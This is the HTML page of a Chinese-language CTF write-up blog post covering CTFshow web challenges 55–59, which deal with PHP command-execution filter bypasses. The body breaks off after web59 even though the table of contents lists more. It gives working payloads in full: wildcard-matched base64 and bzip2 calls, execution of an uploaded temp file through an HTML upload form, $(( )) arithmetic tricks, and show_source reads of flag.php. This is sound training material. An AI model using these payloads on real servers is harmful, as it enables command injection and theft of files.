@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="web55 1还是查看源代码发现没有过滤数字，我们就想一想在我们查看文件的命令有没有数字开头的。发现存在一个base64  base64的使用 我们就可以通过通配符进行匹配命令执行查看flag.php 12payload：&#96;?c&#x3D;&#x2F;???&#x2F;????64 ????.???&#96; 意思是 &#96;&#x2F;bin&#x2F;base64 flag.php&#96;  bin为binary的简写主要放置一些 系统的必备执行档例如:cat、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow2">
+<meta property="og:url" content="http://example.com/2022/03/11/CTFshow2/index.html">
+<meta property="og:site_name" content="Echo">
+<meta property="og:description" content="web55 1还是查看源代码发现没有过滤数字，我们就想一想在我们查看文件的命令有没有数字开头的。发现存在一个base64  base64的使用 我们就可以通过通配符进行匹配命令执行查看flag.php 12payload：&#96;?c&#x3D;&#x2F;???&#x2F;????64 ????.???&#96; 意思是 &#96;&#x2F;bin&#x2F;base64 flag.php&#96;  bin为binary的简写主要放置一些 系统的必备执行档例如:cat、">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129131445382-16470100546731.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129132748483-16470100546742.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129140232817-16470100546753.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129160319559-16470100546754.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129161423503-16470100546755.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129161233495-16470100546756.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129161304870-16470100546757.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129213051789-16470100546758.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130150100192-16470100546759.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152826193-164701005467510.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220204151353485-164701005467513.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220152051961-164701005467512.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220152145730-164701005467514.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220154514866-164701005467515.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220154722677-164701005467516.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220163455540-164701005467517.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220190908376-164701005467518.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220190951090-164701005467519.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220192653988-164701005467520.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220194519359-164701005467521.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220194703989-164701005467522.png">
+<meta property="og:image" content="http://example.com/2022/03/11/CTFshow2/image-20220220201703149-164701005467523.png">
+<meta property="article:published_time" content="2022-03-11T14:46:55.000Z">
+<meta property="article:modified_time" content="2022-03-29T15:57:42.073Z">
+<meta property="article:author" content="CJ">
+<meta property="article:tag" content="STUDY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/11/CTFshow2/image-20220129131445382-16470100546731.png">
+
+
+<link rel="canonical" href="http://example.com/2022/03/11/CTFshow2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/03/11/CTFshow2/","path":"2022/03/11/CTFshow2/","title":"CTFshow2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTFshow2 | Echo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Echo</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web55"><span class="nav-number">1.</span> <span class="nav-text">web55</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web56"><span class="nav-number">2.</span> <span class="nav-text">web56</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web57"><span class="nav-number">3.</span> <span class="nav-text">web57</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web58"><span class="nav-number">4.</span> <span class="nav-text">web58</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web59"><span class="nav-number">5.</span> <span class="nav-text">web59</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web60"><span class="nav-number">6.</span> <span class="nav-text">web60</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web61"><span class="nav-number">7.</span> <span class="nav-text">web61</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web62"><span class="nav-number">8.</span> <span class="nav-text">web62</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web63"><span class="nav-number">9.</span> <span class="nav-text">web63</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web64"><span class="nav-number">10.</span> <span class="nav-text">web64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web65"><span class="nav-number">11.</span> <span class="nav-text">web65</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web66"><span class="nav-number">12.</span> <span class="nav-text">web66</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web67"><span class="nav-number">13.</span> <span class="nav-text">web67</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web68"><span class="nav-number">14.</span> <span class="nav-text">web68</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web69"><span class="nav-number">15.</span> <span class="nav-text">web69</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web70"><span class="nav-number">16.</span> <span class="nav-text">web70</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web71"><span class="nav-number">17.</span> <span class="nav-text">web71</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E6%87%82web72"><span class="nav-number">18.</span> <span class="nav-text">不懂web72</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web73"><span class="nav-number">19.</span> <span class="nav-text">web73</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web74"><span class="nav-number">20.</span> <span class="nav-text">web74</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web75"><span class="nav-number">21.</span> <span class="nav-text">web75</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web76"><span class="nav-number">22.</span> <span class="nav-text">web76</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web77"><span class="nav-number">23.</span> <span class="nav-text">web77</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web118"><span class="nav-number">24.</span> <span class="nav-text">web118</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CJ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/11/CTFshow2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFshow2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-11 22:46:55" itemprop="dateCreated datePublished" datetime="2022-03-11T22:46:55+08:00">2022-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-29 23:57:42" itemprop="dateModified" datetime="2022-03-29T23:57:42+08:00">2022-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>13k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>12 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><p><img src="/2022/03/11/CTFshow2/image-20220129131445382-16470100546731.png" alt="image-20220129131445382"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还是查看源代码发现没有过滤数字，我们就想一想在我们查看文件的命令有没有数字开头的。发现存在一个<span class="built_in">base64</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>base64的使用</strong></p>
+<p>我们就可以通过通配符进行匹配命令执行查看flag.php</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：`?c=<span class="regexp">/???/</span>????<span class="number">64</span> ????.???`</span><br><span class="line"> 意思是 `<span class="regexp">/bin/</span>base64 flag.php`</span><br></pre></td></tr></table></figure>
+
+<p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64,bzip2等</p>
+<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
+<p><strong>bzip2的使用</strong></p>
+<p>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="number">2</span> <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?    <span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">??</span><span class="number">2</span> <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?</span><br><span class="line">也就是/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>然后访问/flag.php.bz2进行下载获得flag.php<br><img src="/2022/03/11/CTFshow2/image-20220129132748483-16470100546742.png" alt="image-20220129132748483"></p>
+<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="/2022/03/11/CTFshow2/image-20220129140232817-16470100546753.png" alt="image-20220129140232817"></p>
+<p>无字母数字</p>
+<p>使用<code>^</code>以及| 运算符进行拼接命令然后执行。然后发现其他改变就是不会执行也不是<code>eval()</code>函数，然后就失败了  </p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
+<p>可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）<br>注意：通过.去执行sh命令不需要有执行权限<br>在这个之前我们需要构造一个post上传文件的数据包。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/11/CTFshow2/image-20220129160319559-16470100546754.png" alt="image-20220129160319559"></p>
+<p>随便提交个文件bp抓包</p>
+<p><img src="/2022/03/11/CTFshow2/image-20220129161423503-16470100546755.png" alt="image-20220129161423503"></p>
+<p>构造poc执行命令，原因详见 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
+<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：我们可以利用<code>[@-[]</code>来表示大写字母：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>=.+<span class="regexp">/???/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br><span class="line">+<span class="symbol">:</span>空格的意思，也可以用空格编码%<span class="number">20</span>                     空格 + %<span class="number">20</span> 都可以表示空格</span><br></pre></td></tr></table></figure>
+
+<p>123为1.txt的内容  然后在上传文件内容添加sh命令                                   </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p>1、linux shell脚本中，# 是注释符号。#！是不同于#的另外一种特殊的表示符号。</p>
+<p>2、#！后面是解释此脚本的shell路径。shell程序必须以”#!/bin/sh”开始</p>
+<p>3、shell的种类有很多，可以通过 </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>shells</span><br></pre></td></tr></table></figure>
+
+<p>查看shell的种类。</p>
+<pre><code>/bin/sh
+/bin/bash
+/bin/rbash
+/bin/dash
+</code></pre>
+<p>4、脚本的内容是由解释器进行解释，可以用各种各样的解释器来写对应的脚本。<br><img src="/2022/03/11/CTFshow2/image-20220129161233495-16470100546756.png" alt="image-20220129161233495"></p>
+<p><img src="/2022/03/11/CTFshow2/image-20220129161304870-16470100546757.png" alt="image-20220129161304870"></p>
+<p>点两次send就有反映了。</p>
+<p><strong>说明一下为什么在使用eval()函数有时候需要添加?&gt;</strong></p>
+<p>原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo<br>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。<br>所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。<br>闭合之后就相当于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`ls`;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p><img src="/2022/03/11/CTFshow2/image-20220129213051789-16470100546758.png" alt="image-20220129213051789"></p>
+<p>要构造出36</p>
+<p>没有过滤$ {} _  ()              </p>
+<p>知识点是$(( ))与整数运算。想办法构造出36.</p>
+<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p>
+<p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p>
+<p>可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p>
+<p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p>
+<p>注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
+<p><code>$(())</code>的值是0   如果b=<del>a，那么a+b=-1。若a=0,</del>0=-1因此：若要获得36，就要对-37取反</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))   ~<span class="number">0</span>=<span class="number">-1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>(( <span class="symbol">$</span>((~<span class="symbol">$</span>(()))) <span class="symbol">$</span>((~<span class="symbol">$</span>(()))) ))   #<span class="symbol">$</span>((<span class="number">-1</span><span class="number">-1</span>))即<span class="symbol">$</span><span class="symbol">$</span>((<span class="number">-2</span>))是<span class="number">-2</span></span><br></pre></td></tr></table></figure>
+
+<p>因此在里面放37个<code>$((~$(())))</code>，就可以得到-37，然后取反就可以了。  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">((~$((-<span class="number">37</span>))))</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) ))))</span></span><br></pre></td></tr></table></figure>
+
+<p>再查看源代码即可</p>
+<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><p>命令执行，突破禁用函数</p>
+<p><img src="/2022/03/11/CTFshow2/image-20220130150100192-16470100546759.png" alt="image-20220130150100192"></p>
+<p>查看禁用了那些函数   c=phpinfo(); phpinfo被禁了 ；一个一个试 system ，shell_exec() 被禁用了                                                                                        </p>
+<p>以下可用：         </p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>() 函数对文件进行语法高亮显示。                                                        <span class="variable">echo</span> <span class="title">file_get_contents</span>()                                                                      <span class="variable">echo</span> <span class="title">highlight_file</span>()                                                                   <span class="variable">highlight_file</span>     </span></span><br><span class="line"><span class="function"><span class="title"><span class="built_in">readfile</span></span>()																</span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152826193-164701005467510.png" alt="image-20220130152826193"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
